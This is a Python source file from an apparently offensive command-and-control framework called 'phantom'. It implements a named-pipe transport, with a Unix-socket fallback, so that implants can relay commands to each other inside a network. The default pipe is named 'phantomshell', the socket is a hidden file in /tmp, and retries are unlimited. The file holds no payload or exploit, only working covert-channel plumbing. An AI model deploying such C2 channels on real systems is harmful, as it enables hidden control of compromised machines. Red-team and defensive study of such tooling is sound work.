"""Named Pipe transport for Windows internal C2 (agent-to-agent).

On Windows: uses ctypes to call CreateNamedPipe / CreateFile / ConnectNamedPipe
without requiring pywin32.

On Linux/macOS: falls back to Unix domain sockets with an equivalent interface.

Framing uses the same 4-byte big-endian length prefix as TcpTransport.
"""

import ctypes
import logging
import os
import platform
import socket
import struct
import threading
import time

log = logging.getLogger("phantom.transport.named_pipe")

_IS_WINDOWS = platform.system() == "Windows"

# Windows constants for Named Pipes (used via ctypes)
if _IS_WINDOWS:
    _kernel32 = ctypes.windll.kernel32

    _PIPE_ACCESS_DUPLEX = 0x00000003
    _PIPE_TYPE_BYTE = 0x00000000
    _PIPE_READMODE_BYTE = 0x00000000
    _PIPE_WAIT = 0x00000000
    _PIPE_UNLIMITED_INSTANCES = 255
    _BUFFER_SIZE = 65536
    _INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
    _OPEN_EXISTING = 3
    _GENERIC_READ = 0x80000000
    _GENERIC_WRITE = 0x40000000
    _ERROR_PIPE_BUSY = 231
    _NMPWAIT_WAIT_FOREVER = 0xFFFFFFFF


class NamedPipeTransport:
    """C2 transport over Named Pipes (Windows) or Unix domain sockets (Linux).

    Supports client and server modes for agent-to-agent communication
    within a network without requiring internet access.

    Wire format: 4-byte big-endian length prefix + payload (matches TcpTransport).
    """

    def __init__(self, pipe_name: str = "phantomshell", mode: str = "client",
                 host: str = ".", timeout: float = 30.0,
                 retry_count: int = -1, retry_delay: float = 5.0):
        self.pipe_name = pipe_name
        self.mode = mode.lower()
        self.host = host
        self.timeout = timeout
        self.retry_count = retry_count
        self.retry_delay = retry_delay
        self._connected = False
        self._lock = threading.Lock()

        if _IS_WINDOWS:
            if self.host == ".":
                self._pipe_path = rf"\\.\pipe\{self.pipe_name}"
            else:
                self._pipe_path = rf"\\{self.host}\pipe\{self.pipe_name}"
            self._handle = None
        else:
            # Unix domain socket fallback
            self._socket_path = f"/tmp/.{self.pipe_name}.sock"
            self._sock: socket.socket | None = None
            self._client_sock: socket.socket | None = None
            self._server_sock: socket.socket | None = None

    @property
    def connected(self) -> bool:
        return self._connected

    def connect(self) -> bool:
        if _IS_WINDOWS:
            return self._connect_windows()
        else:
            return self._connect_unix()

    def _connect_windows(self) -> bool:
        if self.mode == "server":
            return self._server_windows()
        return self._client_windows()

    def _server_windows(self) -> bool:
        """Create a Named Pipe server and wait for a client connection."""
        try:
            self._handle = _kernel32.CreateNamedPipeW(
                self._pipe_path,
                _PIPE_ACCESS_DUPLEX,
                _PIPE_TYPE_BYTE | _PIPE_READMODE_BYTE | _PIPE_WAIT,
                _PIPE_UNLIMITED_INSTANCES,
                _BUFFER_SIZE,
                _BUFFER_SIZE,
                0,
                None,
            )
            if self._handle == _INVALID_HANDLE_VALUE:
                log.error("CreateNamedPipe failed")
                return False

            log.info(f"Waiting for pipe client on {self._pipe_path}")
            result = _kernel32.ConnectNamedPipe(self._handle, None)
            if not result:
                err = ctypes.GetLastError()
                # ERROR_PIPE_CONNECTED (535) means client already connected
                if err != 535:
                    log.error(f"ConnectNamedPipe failed: error {err}")
                    return False

            self._connected = True
            log.info("Named pipe client connected")
            return True

        except Exception as e:
            log.error(f"Pipe server error: {e}")
            return False

    def _client_windows(self) -> bool:
        """Connect to an existing Named Pipe server."""
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            try:
                self._handle = _kernel32.CreateFileW(
                    self._pipe_path,
                    _GENERIC_READ | _GENERIC_WRITE,
                    0,
                    None,
                    _OPEN_EXISTING,
                    0,
                    None,
                )
                if self._handle != _INVALID_HANDLE_VALUE:
                    self._connected = True
                    log.info(f"Connected to pipe {self._pipe_path}")
                    return True

                err = ctypes.GetLastError()
                if err == _ERROR_PIPE_BUSY:
                    _kernel32.WaitNamedPipeW(self._pipe_path,
                                             _NMPWAIT_WAIT_FOREVER)
                    continue
                log.warning(f"CreateFile failed: error {err}")

            except Exception as e:
                log.warning(f"Pipe connect error: {e}")

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                return False
            time.sleep(self.retry_delay)
        return False

    def _connect_unix(self) -> bool:
        """Unix domain socket fallback for Linux/macOS."""
        if self.mode == "server":
            return self._server_unix()
        return self._client_unix()

    def _server_unix(self) -> bool:
        """Create a Unix domain socket server."""
        try:
            # Clean up stale socket file
            if os.path.exists(self._socket_path):
                os.unlink(self._socket_path)

            self._server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            self._server_sock.bind(self._socket_path)
            # Restrict permissions to owner only
            os.chmod(self._socket_path, 0o600)
            self._server_sock.listen(1)
            self._server_sock.settimeout(self.timeout)

            log.info(f"Waiting for Unix socket client on {self._socket_path}")
            self._client_sock, _ = self._server_sock.accept()
            self._client_sock.settimeout(self.timeout)
            self._connected = True
            log.info("Unix socket client connected")
            return True

        except Exception as e:
            log.error(f"Unix socket server error: {e}")
            return False

    def _client_unix(self) -> bool:
        """Connect to a Unix domain socket server."""
        attempts = 0
        while self.retry_count == -1 or attempts < self.retry_count:
            try:
                self._sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                self._sock.settimeout(self.timeout)
                self._sock.connect(self._socket_path)
                self._connected = True
                log.info(f"Connected to Unix socket {self._socket_path}")
                return True
            except OSError as e:
                log.warning(f"Unix socket connect failed: {e}")
                if self._sock:
                    self._sock.close()
                    self._sock = None

            attempts += 1
            if self.retry_count != -1 and attempts >= self.retry_count:
                return False
            time.sleep(self.retry_delay)
        return False

    def send(self, data: bytes) -> bool:
        if not self._connected:
            return False

        frame = struct.pack(">I", len(data)) + data

        with self._lock:
            if _IS_WINDOWS:
                return self._write_windows(frame)
            else:
                return self._write_unix(frame)

    def _write_windows(self, data: bytes) -> bool:
        try:
            written = ctypes.c_ulong(0)
            success = _kernel32.WriteFile(
                self._handle,
                data,
                len(data),
                ctypes.byref(written),
                None,
            )
            if not success:
                log.error("WriteFile failed on pipe")
                self._connected = False
                return False
            return True
        except Exception as e:
            log.error(f"Pipe write error: {e}")
            self._connected = False
            return False

    def _write_unix(self, data: bytes) -> bool:
        sock = self._client_sock or self._sock
        if not sock:
            return False
        try:
            sock.sendall(data)
            return True
        except OSError as e:
            log.error(f"Unix socket write error: {e}")
            self._connected = False
            return False

    def recv(self) -> bytes | None:
        if not self._connected:
            return None

        with self._lock:
            if _IS_WINDOWS:
                return self._read_windows()
            else:
                return self._read_unix()

    def _read_windows(self) -> bytes | None:
        try:
            # Read 4-byte length prefix
            length_buf = ctypes.create_string_buffer(4)
            bytes_read = ctypes.c_ulong(0)
            success = _kernel32.ReadFile(
                self._handle,
                length_buf,
                4,
                ctypes.byref(bytes_read),
                None,
            )
            if not success or bytes_read.value != 4:
                self._connected = False
                return None

            length = struct.unpack(">I", length_buf.raw)[0]
            if length > 10 * 1024 * 1024:
                log.error(f"Message too large: {length}")
                return None

            payload_buf = ctypes.create_string_buffer(length)
            total_read = 0
            while total_read < length:
                remaining = length - total_read
                chunk_buf = ctypes.create_string_buffer(remaining)
                success = _kernel32.ReadFile(
                    self._handle,
                    chunk_buf,
                    remaining,
                    ctypes.byref(bytes_read),
                    None,
                )
                if not success or bytes_read.value == 0:
                    self._connected = False
                    return None
                ctypes.memmove(
                    ctypes.addressof(payload_buf) + total_read,
                    chunk_buf,
                    bytes_read.value,
                )
                total_read += bytes_read.value

            return payload_buf.raw

        except Exception as e:
            log.error(f"Pipe read error: {e}")
            self._connected = False
            return None

    def _read_unix(self) -> bytes | None:
        sock = self._client_sock or self._sock
        if not sock:
            return None
        try:
            length_data = self._recv_exact_unix(sock, 4)
            if not length_data:
                return None
            length = struct.unpack(">I", length_data)[0]
            if length > 10 * 1024 * 1024:
                log.error(f"Message too large: {length}")
                return None
            return self._recv_exact_unix(sock, length)
        except OSError as e:
            log.error(f"Unix socket read error: {e}")
            self._connected = False
            return None

    def _recv_exact_unix(self, sock: socket.socket, n: int) -> bytes | None:
        buf = bytearray()
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                self._connected = False
                return None
            buf.extend(chunk)
        return bytes(buf)

    def disconnect(self):
        self._connected = False
        if _IS_WINDOWS:
            self._close_windows()
        else:
            self._close_unix()
        log.info("Named pipe transport disconnected")

    def _close_windows(self):
        if self._handle and self._handle != _INVALID_HANDLE_VALUE:
            try:
                if self.mode == "server":
                    _kernel32.DisconnectNamedPipe(self._handle)
                _kernel32.CloseHandle(self._handle)
            except Exception:
                pass
            self._handle = None

    def _close_unix(self):
        for sock in (self._client_sock, self._sock, self._server_sock):
            if sock:
                try:
                    sock.close()
                except OSError:
                    pass
        self._client_sock = None
        self._sock = None
        self._server_sock = None

        # Clean up socket file if we were the server
        if self.mode == "server" and os.path.exists(self._socket_path):
            try:
                os.unlink(self._socket_path)
            except OSError:
                pass
